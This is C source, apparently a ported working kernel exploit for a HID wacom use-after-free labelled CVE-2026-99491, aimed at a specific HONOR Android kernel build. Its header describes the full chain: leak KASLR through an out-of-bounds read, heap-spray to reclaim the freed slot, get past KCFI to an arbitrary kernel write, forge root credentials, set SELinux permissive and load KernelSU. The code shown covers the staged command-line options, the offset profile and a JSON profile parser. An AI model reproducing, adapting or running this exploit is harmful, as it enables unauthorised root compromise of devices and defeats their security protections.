/*
 * CVE-2026-99491 - HID wacom: dangling sibling touch_input UAF -> controlled call
 * Target : HONOR YLP-W00, kernel 6.12.58-android16-6-g142ddad31e60 (117)
 * Kernel : drivers/hid/wacom_wac.c as of 6.12.58 (pre-6.12.117 fix
 *          ef32877368a7 / 1178927ffa54)
 * SELinux: Enforcing at entry (uhid write + evdev read allowed for shell)
 * Patches: absent (shared->touch_input never cleared on sibling removal)
 * Mitig. : CFI_CLANG=y (KCFI), KASLR on (slide leaked here), SMEP/SMAP on
 * Status : EXP - three selectable modes; `--help` carries the status column
 *
 * Modes
 * -----
 *   real_cred  [verified]     forged cred -> eqreal -> setcon -> permissive,
 *                             inline KSU; default; verified on 117 with the
 *                             uinput-carried chain.
 *   tracefs    [non-mainline] legacy tracefs cred leak -> direct cred/caps;
 *                             inline KSU; pre-rework regression 0/4 on 117;
 *                             2026-11-22 rework 5/5; prints a status note.
 *   no-tracefs [non-mainline] real_cred fork: swap + fork/exec delivery and
 *                             fork/exec KSU loader; internal name
 *                             no-tracefs-fakecred; 5/5 clean-boot block.
 *
 * All kernel addresses, struct offsets, capability limits, spray geometry
 * and KSU paths come from a flat JSON profile loaded at runtime
 * (--profile PATH, env CVE99491_PROFILE, or the workdir profile.json).
 *
 * Shared chain
 * ------------
 * 1. Anchor device A (uhid): its descriptor carries a forged ToolSerial
 *    usage array (wacom_wac_pen_serial_enforce OOB read, CVE-2026-98499)
 *    so an INPUT2 report reads 32 bits at A + serial_read_base_off +
 *    4*index and delivers them as EV_MSC/MSC_SERIAL on A's evdev node.
 *    The waitq self-pointer indices yield the uhid_device base and the
 *    worker.func indices yield the KASLR slide.  An InRange=0 report
 *    clears wacom_wac->serial[0] (wacom_wac_pen_report), so reads repeat.
 * 2. A's input_buf data area is rewritten verbatim by every UHID_INPUT2
 *    write, so it hosts fake structures at the profile's c_off_* offsets.
 *    The persistent chain (pchain_first/pchain_re/pc_write) and the
 *    uinput chain (uchain_re) turn one pre-filled input_value into an
 *    8-byte kernel write at an arbitrary target.
 * 3. The 99491 UAF frees the sibling touch input_dev (kmalloc-2k); the
 *    survivor's MUTE_DEVICE report calls input_event() on it.  Reclaiming
 *    the slot with an skb payload yields a fake input_dev with
 *    evbit=EV_SW, swbit=SW_MUTE_DEVICE, event_lock=0, max_vals=2 and
 *    grab = fake input_handle.  input_pass_values() then calls the
 *    KCFI-checked handle_events pointer.
 * 4. The fake input_handle points at a fake input_handler whose event is
 *    input_inject_event; that stores one pre-filled input_value through
 *    D->vals (an arbitrary kernel pointer) on a fake input_dev in the
 *    anchor input_buf.  A trailing EV_SYN/SYN_REPORT entry is dropped
 *    unless EV_SYN is set in D->evbit.
 * 5. A pad-triggered retrigger drains the spray sockets first; a missed
 *    respray would feed an unowned object to input_event().  The
 *    bootstrap and every retrigger are therefore oracle-verified: the
 *    close-time kmem:kfree identifies the real touch sibling (the three
 *    same-site wacom allocations are candidates; only the touch is freed
 *    in the armed window), an immediate sniff chunk is checked for an
 *    skb allocation at that pointer, and the run parks instead of
 *    triggering when the oracle cannot confirm the reclaim.
 * 6. Once a uinput input_dev's grab is pointed at the anchor handle, no
 *    pad report is needed: every later chain write rewrites the anchor
 *    and injects one evdev event.  EV_ABS axes rotate and are primed
 *    because uinput drops an event equal to its stored absinfo value; an
 *    EV_SYN write pairs a dropped EV_PWR with SYN_REPORT so the flush
 *    stores the kernel's eight zero bytes at the target.  The
 *    input_dev_list walk finds that device from the static global; slab
 *    reads use n+1-byte guarded copies so the source stays inside the
 *    cache's hardened-usercopy region.
 *
 * Mode endgames
 * -------------
 * real_cred:  The KCFI ids from the profile (0xb87c5ccb for
 *    input_pass_values -> handle_events and 0x76675260 for
 *    input_handle_events_default -> handler->event) must match the chain
 *    functions; a HID callback is not KCFI-compatible with
 *    call_usermodehelper.  Retargeting the anchor's outq[0] turns
 *    uhid_char_read() into an arbitrary 4 KiB read (copy_to_user ends on a
 *    PROT_NONE guard page, so the -EFAULT path skips the kfree).  The read
 *    walks __per_cpu_offset[] -> rq->curr -> task; a comm marker proves
 *    the task pointer, and init_cred is the template for the forged cred.
 *    After the early bootstrap the uinput trigger carries the chain, so
 *    the per-write reclaim races disappear; chain writes install the
 *    forged cred at task->cred, restore real_cred's high half, then
 *    overwrite real_cred so cred == real_cred.  setcon() to the profile's
 *    selinux_shell_domain commits a normal shell-domain cred; the outq is
 *    disarmed, enforcing is restored, and /system/bin/sh runs in place as
 *    uid 0.  CVE99491_KEEP_PERMISSIVE leaves the permissive window open
 *    and CVE99491_EXEC_CMD chooses what runs, which is how the manager's
 *    own ksud late-load is handed the root process.
 * tracefs:    The main-tree direct-cred path enables the kmem_cache_alloc
 *    tracepoint through tracefs, reads the exec'd child's private cred
 *    address from the per-CPU raw ring, then bootstraps the uinput chain
 *    (real_cred-style self cell) and writes uid/gid/euid/egid (EV_SYN),
 *    cap_bset/cap_permitted (EV_PWR) and the SELinux state (EV_ABS)
 *    directly to that cred.  It does not use the forged-cred endgame or
 *    setcon.
 * no-tracefs: The real_cred read/forgery path, but only task->cred is
 *    swapped (no real_cred equalize, no setcon).  The shell is delivered
 *    through fork+exec.
 *
 * The uhid/input/cred/task/rq/selinux offsets and the target build's
 * symbols all come from data/profile.json; the source tree ships the
 * verified profile, other releases are adapted with scripts/adapt.py.
 */
/*
 * ---------------------------------------------------------------------------
 * lhasa port (branch next-99491-realcred, 2026-11-25) -- NOT upstream code.
 *
 * Upstream   : Yunnijian/CVE-2026-99491 @1923ac893d582e4b87b748ea033be4a004d894b1
 *              tools/realcred/exp.c (git blob 9c58379f3dd475bfef7df20f2a4529ffe13b97cf)
 * License    : GPL-2.0-only (see ../LICENSE and ../NOTICE; keep both).
 * Derived from the FANXIAOCHAO reference port (woshigenm/CVE-2026-99491-FANXIAOCHAO).
 *
 * Port changes (all profiles remain runtime data, no build constants here):
 *   - CLI only accepts --stage=leak|oracle|write|selinux|full (default full)
 *     and rejects the non-mainline --mode values, keeping their code dormant;
 *   - stage gates: leak = profile check + KASLR anchor only (no UAF),
 *     oracle = verified reclaim only (no kernel write), write = one 8-byte
 *     own-cred field write (uid/euid untouched), selinux = permissive window
 *     opened and restored, full = chain + ksud late-load;
 *   - machine-parsable markers for the App: [p] profile_ok, [p] anchor,
 *     [+] swap, [+] cred == real_cred, [+] setcon, MODULE_LOADED,
 *     [f] module_live=1 enforce=1, [f] su_check, PARKED (see ../README.md);
 *   - profile.h is GENERATED by tools/99491/gen_profile.py from
 *     app/src/main/assets/lhasa_99491_profile.json; missing workdir/profile.json
 *     falls back to the compiled-in builtin profile, an explicit --profile
 *     remains fail-closed;
 *   - KSU loader selection is profile-driven (ksu_backend / ksu_ksud_path):
 *     prefer the deployed assets ksud, then the manager APK's libksud.so;
 *   - vendor HAL repair is a profile switch (hal_patch_enable / hal_patch_domains)
 *     and runs only when sys.boot_completed is still 0 after the module is Live;
 *     the code is marked VENDOR-SPECIFIC rather than deleted.
 * ---------------------------------------------------------------------------
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/uhid.h>
#include <linux/uinput.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
/* <sys/fsuid.h> is glibc-only; musl keeps setfsuid in <unistd.h> (or nowhere
 * visible), so declare it explicitly to build with both toolchains. */
extern int setfsuid(uid_t);

#include "parked.h"
#include "profile.h"

static struct cve99491_profile g_prof;

/* --- staged CLI (port addition) --------------------------------------
 * --stage cuts the real_cred chain at the gate the test plan needs:
 *   leak    profile check + KASLR anchor leak only, never fires the UAF
 *   oracle  verified reclaim only (no kernel write at all)
 *   write   bootstrap + identity verify + one 8-byte own-cred field write
 *   selinux permissive window opened and restored, no module
 *   full    the whole chain incl. the profile-selected ksud late-load
 * Only real_cred is a supported mode; the tracefs/no-tracefs code paths are
 * kept for reference but are unreachable from the CLI. */
enum exp_stage {
    STAGE_FULL = 0,
    STAGE_LEAK,
    STAGE_ORACLE,
    STAGE_WRITE,
    STAGE_SELINUX,
    STAGE_TRIGGER, /* port: pad-report -> reclaimed input_dev fixed-word probe */
    STAGE_CRED,    /* direct engine: tracefs cred leak + euid oracle */
    STAGE_ROOT,    /* direct engine: cred + caps + permissive + ksud late-load */
};

static int g_stage = STAGE_FULL;
static const char *g_stage_name = "full";
/* --stage=trigger: 5.15-style direct-vals probe.  The reclaimed input_dev
 * gets vals = g_trigger_vals, num_vals = 0 and no grab; the pad MUTE report
 * appends ONE EV_SW input_value there (input_sync's EV_SYN value is gated
 * out by the fake dev's evbit, which only carries EV_SW on this build), so a
 * single fixed word can be written without the fake-handle chain.
 * g_trigger_chain switches the same fixed word onto the fake-handle chain to
 * isolate direct-vals from the chain path. */
static int g_trigger_probe;
static int g_trigger_chain; /* CVE99491_TRIGGER_MODE=chain: use the fake-handle
                             * chain to write the fixed word instead of the
                             * direct vals store, isolating the chain path */
static unsigned long long g_trigger_vals;

#define WACOM_VID 0x056a
#define PHYS_COMMON "uhidpair/99"
#define NAME_TOUCH "wacom-pair-touch"
#define NAME_PAD   "wacom-pair-pad"
#define NAME_ANCHOR "wacom-anchor"

/* Profile-derived symbols and layout values. */
#define SYM_UHID_WORKER   (g_prof.sym_uhid_worker)
#define SYM_IHE_DEFAULT   (g_prof.sym_ihe_default)
#define SYM_INJECT_EVENT  (g_prof.sym_inject_event)
#define SYM_SELINUX_STATE (g_prof.sym_selinux_state)
#define UHID_WAITQ_SELF   (g_prof.uhid_waitq_self)
#define INIT_CRED_ADDR    (g_prof.sym_init_cred)
#define SYM_PER_CPU_OFFSET (g_prof.sym_per_cpu_offset)
#define SYM_RUNQUEUES     (g_prof.sym_runqueues)
#define SYM_INPUT_DEV_LIST (g_prof.sym_input_dev_list)
#define RQ_OFF_CURR       (g_prof.rq_off_curr)
#define RQ_OFF_IDLE       (g_prof.rq_off_idle)
#define TS_OFF_CRED       (g_prof.ts_off_cred)
#define TS_OFF_REAL_CRED  (g_prof.ts_off_real_cred)
#define TS_OFF_COMM       (g_prof.ts_off_comm)

#define UHID_DATA_OFF     (g_prof.uhid_input_buf_data_off)
#define UHID_HEAD_OFF     (g_prof.uhid_waitq_head_off)
#define UHID_OUTQ_OFF     (g_prof.uhid_outq_off)
#define IDX_WAITQ_LO \
    ((int)((g_prof.uhid_waitq_self - g_prof.uhid_serial_read_base_off) / 4))
#define IDX_WAITQ_HI      (IDX_WAITQ_LO + 1)
#define IDX_WORKER_LO \
    ((int)((g_prof.uhid_worker_func_off - \
            g_prof.uhid_serial_read_base_off) / 4))
#define IDX_WORKER_HI     (IDX_WORKER_LO + 1)

#define C_OFF_H           (g_prof.c_off_h)
#define C_OFF_P           (g_prof.c_off_p)
#define C_OFF_D           (g_prof.c_off_d)
#define C_OFF_E           (g_prof.c_off_e)
#define C_OFF_SCRATCH     (g_prof.c_off_scratch)
#define C_OFF_FAKE        (g_prof.c_off_fake)

#define IH_DEV_OFF        (g_prof.input_handle_dev_off)
#define IH_HANDLER_OFF    (g_prof.input_handle_handler_off)
#define IH_EVENTS_OFF     (g_prof.input_handle_events_off)
#define IHANDLER_EVENT_OFF (g_prof.input_handler_event_off)

#define IDEV_EVBIT_OFF    (g_prof.input_dev_evbit_off)
#define IDEV_SWBIT_OFF    (g_prof.input_dev_swbit_off)
#define IDEV_GRAB_OFF     (g_prof.input_dev_grab_off)
#define IDEV_EVENT_LOCK_OFF (g_prof.input_dev_event_lock_off)
#define IDEV_NUM_VALS_OFF (g_prof.input_dev_num_vals_off)
#define IDEV_MAX_VALS_OFF (g_prof.input_dev_max_vals_off)
#define IDEV_VALS_OFF     (g_prof.input_dev_vals_off)
#define IDEV_ABSBIT_OFF   (g_prof.input_dev_absbit_off)
#define IDEV_ABSINFO_OFF  (g_prof.input_dev_absinfo_off)
#define IDEV_EVENT_OFF    (g_prof.input_dev_event_off)
#define IDEV_HLIST_OFF    (g_prof.input_dev_hlist_off)
#define IDEV_INHIBITED_OFF (g_prof.input_dev_inhibited_off)
#define IDEV_ID_OFF       (g_prof.input_dev_id_off)
#define IDEV_NODE_OFF     (g_prof.input_dev_node_off)
#define ABSINFO_SIZE      (g_prof.absinfo_size)

#define CRED_SIZE         (g_prof.cred_bytes)
#define CRED_REQ          (g_prof.cred_req)
#define CR_UID            (g_prof.cred_uid_off)
#define CR_EUID           (g_prof.cred_euid_off)
#define CR_SECUREBITS     (g_prof.cred_securebits_off)
#define CR_CAPPRM         (g_prof.cred_cap_permitted_off)
#define CR_CAPBSET        (g_prof.cred_cap_bset_off)
#define CR_CAP_EFF        (g_prof.cred_cap_effective_off)
#define CR_SECURITY       (g_prof.cred_security_off)
#define CR_USER           (g_prof.cred_user_off)
#define CR_USER_NS        (g_prof.cred_user_ns_off)
#define CR_RCU_OFF        (g_prof.cred_rcu_off)
#define CR_RCU_SIZE       (g_prof.cred_rcu_size)

#define SEL_ENF_OFF       (g_prof.selinux_enforcing_off)
#define SEL_RESTORE       (g_prof.selinux_restore_value)
/* Far from both 0 and SEL_RESTORE: input_handle_abs_event() defuzzes with
 * the dword at target+12, which for selinux_state is policycap[10..13]. */
#define SEL_PRIME         0x40000000
#define CAP_FULL          (g_prof.cap_full_mask)
#define CAP_FULL_HI       ((unsigned)(CAP_FULL >> 32))
#define CAP_LOW_MASK      ((1ULL << g_prof.cap_last_cap) - 1)

#define CRED_SITE_LOW21   (g_prof.cred_site_low21)

/* tracefs mode: cred leak through the kmem tracepoint. */
#define TR_PATH "/sys/kernel/tracing"
#define TR_PAGE 4096UL
#define TRACE_BUF_BYTES (16UL << 20)

/* Capability ABI version (not device-specific). */
#define CAP_VERSION_3 0x20080522U

/* Device-side runtime paths.  Defaults live under the bootstrap workdir;
 * run_paths_init() switches them to the effective profile/CLI workdir so
 * the RUN/PARKED markers and logs move with --workdir. */
static int g_patch_w = -1;
static char g_run_dir[192] = CVE99491_WORKDIR;
static char g_run_log[224] = CVE99491_WORKDIR "/exp2.log";
static char g_run_bootid[224] = CVE99491_WORKDIR "/exp.bootid";
static char g_run_out[224] = CVE99491_WORKDIR "/cred.out";

static void run_paths_init(const char *dir) {
    snprintf(g_run_dir, sizeof(g_run_dir), "%s", dir);
    snprintf(g_run_log, sizeof(g_run_log), "%s/exp2.log", dir);
    snprintf(g_run_bootid, sizeof(g_run_bootid), "%s/exp.bootid", dir);
    snprintf(g_run_out, sizeof(g_run_out), "%s/cred.out", dir);
}

#define SELINUX_SHELL  (g_prof.selinux_shell_domain)

/* Port-added profile fields (schema: tools/99491/gen_profile.py; optional in
 * the JSON, always present in the generated profile.h). */
#define STEXT             (g_prof.stext)
#define ETEXT             (g_prof.etext)
#define KASLR_ALIGN       (g_prof.kaslr_align)
#define SEL_POLICYCAP     (g_prof.selinux_policycap)
#define KSU_BACKEND       (g_prof.ksu_backend)
#define HAL_PATCH_ENABLE  (g_prof.hal_patch_enable)
#define HAL_PATCH_DOMAINS (g_prof.hal_patch_domains)

/* --- flat JSON profile parser (dependency-free) ---------------------- */

struct pj_num {
    const char *key;
    size_t off;
    int width; /* 4 = unsigned int, 8 = unsigned long long */
};

struct pj_str {
    const char *key;
    size_t off;
    size_t cap;
};

#define PJ_NUM(key, field, width) \
    { key, offsetof(struct cve99491_profile, field), width }
#define PJ_STR(key, field) \
    { key, offsetof(struct cve99491_profile, field), \
      sizeof(((struct cve99491_profile *)0)->field) }

static const struct pj_num pj_nums[] = {
    PJ_NUM("format", format, 4),
    PJ_NUM("verified", verified, 4),
    PJ_NUM("page_size", page_size, 4),

    PJ_NUM("sym_uhid_worker", sym_uhid_worker, 8),
    PJ_NUM("sym_ihe_default", sym_ihe_default, 8),
    PJ_NUM("sym_inject_event", sym_inject_event, 8),
    PJ_NUM("sym_selinux_state", sym_selinux_state, 8),
    PJ_NUM("sym_init_cred", sym_init_cred, 8),
    PJ_NUM("sym_per_cpu_offset", sym_per_cpu_offset, 8),
    PJ_NUM("sym_runqueues", sym_runqueues, 8),
    PJ_NUM("sym_input_dev_list", sym_input_dev_list, 8),

    PJ_NUM("cred_site_low21", cred_site_low21, 8),
    PJ_NUM("kcfi_handle_events", kcfi_handle_events, 8),
    PJ_NUM("kcfi_handler_event", kcfi_handler_event, 8),

    PJ_NUM("c_off_h", c_off_h, 4),
    PJ_NUM("c_off_p", c_off_p, 4),
    PJ_NUM("c_off_d", c_off_d, 4),
    PJ_NUM("c_off_e", c_off_e, 4),
    PJ_NUM("c_off_scratch", c_off_scratch, 4),
    PJ_NUM("c_off_fake", c_off_fake, 4),

    PJ_NUM("ts_off_cred", ts_off_cred, 4),
    PJ_NUM("ts_off_real_cred", ts_off_real_cred, 4),
    PJ_NUM("ts_off_comm", ts_off_comm, 4),
    PJ_NUM("rq_off_curr", rq_off_curr, 4),
    PJ_NUM("rq_off_idle", rq_off_idle, 4),

    PJ_NUM("uhid_input_buf_data_off", uhid_input_buf_data_off, 4),
    PJ_NUM("uhid_waitq_head_off", uhid_waitq_head_off, 4),
    PJ_NUM("uhid_outq_off", uhid_outq_off, 4),
    PJ_NUM("uhid_worker_off", uhid_worker_off, 4),
    PJ_NUM("uhid_worker_func_off", uhid_worker_func_off, 4),
    PJ_NUM("uhid_serial_read_base_off", uhid_serial_read_base_off, 4),
    PJ_NUM("uhid_waitq_self", uhid_waitq_self, 4),

    PJ_NUM("input_dev_size", input_dev_size, 4),
    PJ_NUM("input_dev_evbit_off", input_dev_evbit_off, 4),
    PJ_NUM("input_dev_swbit_off", input_dev_swbit_off, 4),
    PJ_NUM("input_dev_grab_off", input_dev_grab_off, 4),
    PJ_NUM("input_dev_event_lock_off", input_dev_event_lock_off, 4),
    PJ_NUM("input_dev_num_vals_off", input_dev_num_vals_off, 4),
    PJ_NUM("input_dev_max_vals_off", input_dev_max_vals_off, 4),
    PJ_NUM("input_dev_vals_off", input_dev_vals_off, 4),
    PJ_NUM("input_dev_absbit_off", input_dev_absbit_off, 4),
    PJ_NUM("input_dev_absinfo_off", input_dev_absinfo_off, 4),
    PJ_NUM("input_dev_event_off", input_dev_event_off, 4),
    PJ_NUM("input_dev_hlist_off", input_dev_hlist_off, 4),
    PJ_NUM("input_dev_inhibited_off", input_dev_inhibited_off, 4),
    PJ_NUM("input_dev_id_off", input_dev_id_off, 4),
    PJ_NUM("input_dev_node_off", input_dev_node_off, 4),
    PJ_NUM("absinfo_size", absinfo_size, 4),
    PJ_NUM("input_handle_size", input_handle_size, 4),
    PJ_NUM("input_handle_dev_off", input_handle_dev_off, 4),
    PJ_NUM("input_handle_handler_off", input_handle_handler_off, 4),
    PJ_NUM("input_handle_events_off", input_handle_events_off, 4),
    PJ_NUM("input_handler_event_off", input_handler_event_off, 4),

    PJ_NUM("cred_req", cred_req, 4),
    PJ_NUM("cred_bytes", cred_bytes, 4),
    PJ_NUM("cred_uid_off", cred_uid_off, 4),
    PJ_NUM("cred_euid_off", cred_euid_off, 4),
    PJ_NUM("cred_securebits_off", cred_securebits_off, 4),
    PJ_NUM("cred_cap_permitted_off", cred_cap_permitted_off, 4),
    PJ_NUM("cred_cap_effective_off", cred_cap_effective_off, 4),
    PJ_NUM("cred_cap_bset_off", cred_cap_bset_off, 4),
    PJ_NUM("cred_security_off", cred_security_off, 4),
    PJ_NUM("cred_user_off", cred_user_off, 4),
    PJ_NUM("cred_user_ns_off", cred_user_ns_off, 4),
    PJ_NUM("cred_rcu_off", cred_rcu_off, 4),
    PJ_NUM("cred_rcu_size", cred_rcu_size, 4),

    PJ_NUM("selinux_enforcing_off", selinux_enforcing_off, 4),
    PJ_NUM("selinux_initialized_off", selinux_initialized_off, 4),
    PJ_NUM("selinux_restore_value", selinux_restore_value, 4),

    PJ_NUM("cap_last_cap", cap_last_cap, 4),
    PJ_NUM("cap_full_mask", cap_full_mask, 8),

    PJ_NUM("spray_pairs", spray_pairs, 4),
    PJ_NUM("spray_len", spray_len, 4),
    PJ_NUM("spray_count", spray_count, 4),
    PJ_NUM("spray_spread_ms", spray_spread_ms, 4),
    PJ_NUM("spray_burst_min", spray_burst_min, 4),
    PJ_NUM("spray_burst_step", spray_burst_step, 4),
    PJ_NUM("spray_wait_ms", spray_wait_ms, 4),
    PJ_NUM("spray_hold_wait_ms", spray_hold_wait_ms, 4),
    PJ_NUM("spray_fill", spray_fill, 4),
    PJ_NUM("spray_trigger_rounds", spray_trigger_rounds, 4),
    PJ_NUM("spray_respray_rounds", spray_respray_rounds, 4),
    PJ_NUM("spray_cpu", spray_cpu, 4),
    PJ_NUM("spray_skb_req", spray_skb_req, 4),

    PJ_NUM("pm_txn_get_application_info", pm_txn_get_application_info, 4),
    PJ_NUM("pm_txn_get_package_info", pm_txn_get_package_info, 4),
    PJ_NUM("pm_user_id", pm_user_id, 4),
};

/* Port-added optional numeric keys: a profile may omit them and keep the
 * built-in defaults from profile.h; when present they are validated. */
static const struct pj_num pj_opt_nums[] = {
    PJ_NUM("stext", stext, 8),
    PJ_NUM("etext", etext, 8),
    PJ_NUM("kaslr_align", kaslr_align, 4),
    PJ_NUM("selinux_policycap", selinux_policycap, 8),
    PJ_NUM("hal_patch_enable", hal_patch_enable, 4),
};

static const struct pj_str pj_strs[] = {
    PJ_STR("cve", cve),
    PJ_STR("release", release),
    PJ_STR("arch", arch),
    PJ_STR("label", label),
    PJ_STR("pm_binder_lib", pm_binder_lib),
    PJ_STR("pm_service", pm_service),
    PJ_STR("pm_interface", pm_interface),
    PJ_STR("selinux_shell_domain", selinux_shell_domain),
    PJ_STR("ksu_manager", ksu_manager),
    PJ_STR("ksu_manager_apk_root", ksu_manager_apk_root),
    PJ_STR("ksu_workdir", ksu_workdir),
    PJ_STR("ksu_module_name", ksu_module_name),
    PJ_STR("ksu_ksud_name", ksu_ksud_name),
    PJ_STR("ksu_ksud_path", ksu_ksud_path),
    PJ_STR("ksu_ksu_bin_dir", ksu_ksu_bin_dir),
    PJ_STR("ksu_modules_dir", ksu_modules_dir),
    PJ_STR("ksu_lib_subpath", ksu_lib_subpath),
    PJ_STR("ksu_lib_subpath_v8a", ksu_lib_subpath_v8a),
};

/* Port-added optional string keys (defaults in profile_parse). */
static const struct pj_str pj_opt_strs[] = {
    PJ_STR("ksu_backend", ksu_backend),
    PJ_STR("hal_patch_domains", hal_patch_domains),
};

static void pj_err(char *err, size_t cap, const char *fmt, ...) {
    va_list ap;

    if (!err || !cap)
        return;
    va_start(ap, fmt);
    vsnprintf(err, cap, fmt, ap);
    va_end(ap);
}

static const char *pj_skip_ws(const char *s, const char *end) {
    while (s < end && (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n'))
        s++;
    return s;
}

static int pj_hex4(const char *s, const char *end, unsigned *out) {
    unsigned v = 0;
    if (end - s < 4)
        return -1;
    for (int i = 0; i < 4; i++) {
        char c = s[i];
        v <<= 4;
        if (c >= '0' && c <= '9')
            v |= (unsigned)(c - '0');
        else if (c >= 'a' && c <= 'f')
            v |= (unsigned)(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F')
            v |= (unsigned)(c - 'A' + 10);
        else
            return -1;
    }
    *out = v;
    return 0;
}

static int pj_string(const char **pp, const char *end, char *out, size_t cap) {
    const char *s = *pp;
    size_t used = 0;

    if (s >= end || *s != '"')
        return -1;
    s++;
    while (s < end && *s != '"') {
        unsigned char c = (unsigned char)*s++;
        unsigned v;
        if (c == '\\') {
            if (s >= end)
                return -1;
            c = (unsigned char)*s++;
            if (c == 'u') {
                if (pj_hex4(s, end, &v) != 0)
                    return -1;
                s += 4;
                c = v < 0x80 ? (unsigned char)v : (unsigned char)'?';
            } else if (c == 'n') {
                c = '\n';
            } else if (c == 't') {
                c = '\t';
            } else if (c == 'r') {
                c = '\r';
            } else if (c != '"' && c != '\\' && c != '/') {
                return -1;
            }
        }
        if (used + 1 >= cap)
            return -1;
        out[used++] = (char)c;
    }
    if (s >= end || *s != '"')
        return -1;
    s++;
    out[used] = 0;
    *pp = s;
    return 0;
}

static int pj_token(const char **pp, const char *end, char *out, size_t cap) {
    const char *s = *pp;
    size_t used = 0;

    while (s < end && *s != ',' && *s != '}' && *s != ']' &&
           *s != ' ' && *s != '\t' && *s != '\r' && *s != '\n') {
        if (used + 1 >= cap)
            return -1;
        out[used++] = *s++;
    }
    out[used] = 0;
    if (!used)
        return -1;
    *pp = s;
    return 0;
}

static int pj_apply_num_table(struct cve99491_profile *p, const char *key,
                              const char *val, char *err, size_t errlen,
                              const struct pj_num *tab, size_t n) {
    for (size_t i = 0; i < n; i++) {
        char *endp = NULL;
        unsigned long long v;

        if (strcmp(key, tab[i].key))
            continue;
        if (!val[0] || val[0] == '-') {
            pj_err(err, errlen, "bad number for %s", key);
            return -1;
        }
        errno = 0;
        v = strtoull(val, &endp, 0);
        if (errno != 0 || !endp || *endp != 0) {
            pj_err(err, errlen, "bad number for %s", key);
            return -1;
        }
        if (tab[i].width == 4) {
            unsigned int u = (unsigned int)v;
            if (v > 0xffffffffULL || u != v) {
                pj_err(err, errlen, "number out of range for %s", key);
                return -1;
            }
            memcpy((char *)p + tab[i].off, &u, sizeof(u));
        } else {
            memcpy((char *)p + tab[i].off, &v, sizeof(v));
        }
        return 0;
    }
    return 1; /* unknown key */
}

static int pj_apply_num(struct cve99491_profile *p, const char *key,
                        const char *val, char *err, size_t errlen) {
    int rc = pj_apply_num_table(p, key, val, err, errlen, pj_nums,
                                sizeof(pj_nums) / sizeof(pj_nums[0]));

    if (rc != 1)
        return rc;
    return pj_apply_num_table(p, key, val, err, errlen, pj_opt_nums,
                              sizeof(pj_opt_nums) / sizeof(pj_opt_nums[0]));
}

static int pj_apply_str_table(struct cve99491_profile *p, const char *key,
                              const char *val, char *err, size_t errlen,
                              const struct pj_str *tab, size_t n) {
    for (size_t i = 0; i < n; i++) {
        if (strcmp(key, tab[i].key))
            continue;
        if (strlen(val) + 1 > tab[i].cap) {
            pj_err(err, errlen, "value too long for %s", key);
            return -1;
        }
        snprintf((char *)p + tab[i].off, tab[i].cap, "%s", val);
        return 0;
    }
    return 1; /* unknown key */
}

static int pj_apply_str(struct cve99491_profile *p, const char *key,
                        const char *val, char *err, size_t errlen) {
    int rc = pj_apply_str_table(p, key, val, err, errlen, pj_strs,
                                sizeof(pj_strs) / sizeof(pj_strs[0]));

    if (rc != 1)
        return rc;
    rc = pj_apply_str_table(p, key, val, err, errlen, pj_opt_strs,
                            sizeof(pj_opt_strs) / sizeof(pj_opt_strs[0]));
    if (rc != 1)
        return rc;
    /* Addresses may be emitted as hex strings for other JSON tools. */
    return pj_apply_num(p, key, val, err, errlen);
}

/* Skip a nested JSON object/array value (metadata blocks such as
 * "calibration").  The flat profile parser only consumes scalar top-level
 * keys; unknown nested metadata must be tolerated, not misparsed. */
static int pj_skip_container(const char **pp, const char *end) {
    const char *s = *pp;
    int depth = 0;

    while (s < end) {
        char c = *s;

        if (c == '"') {
            s++;
            while (s < end && *s != '"') {
                if (*s == '\\' && s + 1 < end)
                    s++;
                s++;
            }
            if (s >= end)
                return -1;
            s++;
            continue;
        }
        if (c == '{' || c == '[') {
            depth++;
        } else if (c == '}' || c == ']') {
            depth--;
            if (depth == 0) {
                *pp = s + 1;
                return 0;
            }
        }
        s++;
    }
    return -1;
}

static int profile_parse(const char *buf, size_t len,
                         struct cve99491_profile *p, char *err,
                         size_t errlen) {
    const char *s = buf, *end = buf + len;

    memset(p, 0xff, sizeof(*p));
    memset(p->cve, 0, sizeof(p->cve));
    memset(p->release, 0, sizeof(p->release));
    memset(p->arch, 0, sizeof(p->arch));
    memset(p->label, 0, sizeof(p->label));
    /* OS/app-specific values come from the profile: the PackageManager
     * binder ABI, the manager package/APK root and the target shell
     * domain.  CLI/env overrides are applied after parsing, and missing
     * mandatory keys fail validation.  KernelSU's own paths keep their
     * conventional defaults so a profile may omit them. */
    memset(p->pm_binder_lib, 0, sizeof(p->pm_binder_lib));
    memset(p->pm_service, 0, sizeof(p->pm_service));
    memset(p->pm_interface, 0, sizeof(p->pm_interface));
    p->pm_txn_get_application_info = 0;
    p->pm_txn_get_package_info = 0;
    p->pm_user_id = 0;
    memset(p->ksu_manager, 0, sizeof(p->ksu_manager));
    memset(p->ksu_manager_apk_root, 0, sizeof(p->ksu_manager_apk_root));
    memset(p->selinux_shell_domain, 0, sizeof(p->selinux_shell_domain));
    snprintf(p->ksu_workdir, sizeof(p->ksu_workdir), "%s",
             CVE99491_WORKDIR);
    snprintf(p->ksu_module_name, sizeof(p->ksu_module_name), "kernelsu");
    snprintf(p->ksu_ksud_name, sizeof(p->ksu_ksud_name), "ksud");
    snprintf(p->ksu_ksud_path, sizeof(p->ksu_ksud_path), "/data/adb/ksud");
    snprintf(p->ksu_ksu_bin_dir, sizeof(p->ksu_ksu_bin_dir),
             "/data/adb/ksu/bin");
    snprintf(p->ksu_modules_dir, sizeof(p->ksu_modules_dir),
             "/data/adb/modules");
    snprintf(p->ksu_lib_subpath, sizeof(p->ksu_lib_subpath),
             "lib/arm64/libksud.so");
    snprintf(p->ksu_lib_subpath_v8a, sizeof(p->ksu_lib_subpath_v8a),
             "lib/arm64-v8a/libksud.so");
    /* Port-added optional fields: absent keys keep these generic defaults
     * (the generated profile.h carries the same defaults).  stext/etext are
     * resolved by the loader from the reference table when the JSON omits
     * them; a runtime profile may leave them 0 and skip that cross-check. */
    p->stext = 0;
    p->etext = 0;
    p->kaslr_align = 0x200000;
